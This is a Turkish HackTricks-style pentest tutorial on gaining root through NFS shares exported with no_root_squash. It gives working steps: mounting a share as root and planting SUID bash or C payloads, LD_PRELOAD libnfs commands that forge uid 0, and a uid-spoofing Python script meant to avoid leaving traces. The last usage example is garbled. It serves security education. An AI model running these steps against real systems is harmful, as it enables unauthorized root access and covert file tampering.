# NFS No Root Squash Yanlış Yapılandırması ile Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}


## Squashing Temel Bilgiler

NFS, dosyalara erişmek için bağlanan client tarafından belirtilen `uid` ve `gid` değerlerine genellikle (özellikle Linux'ta) güvenir (Kerberos kullanılmıyorsa). Ancak server üzerinde bu davranışı **değiştirmek** için ayarlanabilecek bazı yapılandırmalar vardır:

- **`all_squash`**: Her kullanıcı ve grubu **`nobody`** (65534 unsigned / -2 signed) olarak eşleyerek tüm erişimleri squash eder. Bu nedenle herkes `nobody` olur ve hiçbir kullanıcı kullanılmaz.
- **`root_squash`/`no_all_squash`**: Linux'ta varsayılan ayardır ve **yalnızca uid 0 (root)** ile yapılan erişimleri squash eder. Bu nedenle herhangi bir `UID` ve `GID` güvenilir kabul edilir, ancak `0`, `nobody` olarak squash edilir (dolayısıyla root impersonation mümkün değildir).
- **``no_root_squash`**: Etkinleştirildiğinde bu yapılandırma root kullanıcısını bile squash etmez. Bu, bu yapılandırmaya sahip bir directory'yi mount ederseniz ona root olarak erişebileceğiniz anlamına gelir.

**/etc/exports** dosyasında **no_root_squash** olarak yapılandırılmış bir directory bulursanız, ona **client olarak** erişebilir ve bu directory'nin **içine**, makinenin yerel **root** kullanıcısıymış gibi **yazabilirsiniz**.

**NFS** hakkında daha fazla bilgi için:


{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Bash kullanarak Option 1:
- Bu directory'yi bir client makinesine **mount etmek**, ardından **root olarak mounted folder'ın içine** **/bin/bash** binary'sini kopyalayıp ona **SUID** izinleri vermek ve victim makinesinden bu bash binary'sini **çalıştırmak**.
- NFS share içinde root olabilmek için server'da **`no_root_squash`** yapılandırılmış olmalıdır.
- Ancak etkin değilse, binary'yi NFS share'e kopyalayıp escalate etmek istediğiniz kullanıcı olarak SUID izni vererek başka bir kullanıcıya escalate olabilirsiniz.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2, C ile derlenmiş code kullanarak:
- **Bu directory'yi bir client machine'e mount etmek** ve **root olarak kopyalamak**, mount edilmiş folder'ın içine SUID permission'ı abuse edecek derlenmiş payload'ımızı koymak, ona **SUID** rights vermek ve bu binary'yi **victim** machine'de **execute etmek** (burada bazı [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) bulabilirsiniz).
- Öncekiyle aynı restrictions
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Makinenizden victim makineye bir **tunnel oluşturabiliyorsanız, gerekli portları tunnelling ederek bu privilege escalation için Remote version'ı kullanarak exploit yapmaya devam edebilirsiniz**.\
> Aşağıdaki trick, `/etc/exports` dosyasının **bir IP belirttiği** durum içindir. Bu durumda **remote exploit'i hiçbir şekilde kullanamazsınız** ve **bu trick'i abuse etmeniz** gerekir.\
> Exploit'in çalışması için gereken bir diğer koşul, **`/etc/export` içindeki export'un** **`insecure` flag'ini kullanıyor olmasıdır**.\
> --_`/etc/export` bir IP address belirtiyorsa bu trick'in çalışacağından emin değilim_--

### Temel Bilgiler

Senaryo, local makinede mount edilmiş bir NFS share'ini exploit etmeyi ve client'ın kendi uid/gid'sini belirtmesine izin veren NFSv3 specification'daki bir flaw'dan yararlanarak unauthorized access elde etmeyi içerir. Exploitation, NFS RPC calls'larının forge edilmesini sağlayan bir library olan [libnfs](https://github.com/sahlberg/libnfs) kullanılarak gerçekleştirilir.

#### Library'yi Compile Etme

Library compilation adımları kernel version'a göre adjustment gerektirebilir. Bu özel durumda, fallocate syscalls'ları comment out edildi. Compilation process aşağıdaki commands'leri içerir:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Exploit'i Gerçekleştirme

Exploit, yetkileri root seviyesine yükselten ve ardından bir shell çalıştıran basit bir C programı (`pwn.c`) oluşturmayı içerir. Program derlenir ve ortaya çıkan binary (`a.out`), RPC çağrılarında uid değerini sahtelemek için `ld_nfs.so` kullanılarak suid root ile share üzerine yerleştirilir:

1. **Exploit kodunu derleyin:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Exploit'i paylaşıma yerleştirin ve uid'yi taklit ederek izinlerini değiştirin:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Root yetkileri elde etmek için exploit'i çalıştırın:**
```bash
/mnt/share/a.out
#root
```
### Bonus: Stealthy File Access için NFShell

Root erişimi elde edildikten sonra, sahipliği değiştirmeden (iz bırakmaktan kaçınmak için) NFS share ile etkileşim kurmak amacıyla bir Python script'i (nfsh.py) kullanılır. Bu script, uid değerini erişilen dosyanın uid değeriyle eşleşecek şekilde ayarlayarak share üzerindeki dosyalarla permission sorunları olmadan etkileşim kurulmasını sağlar:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Şu şekilde çalıştırın:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
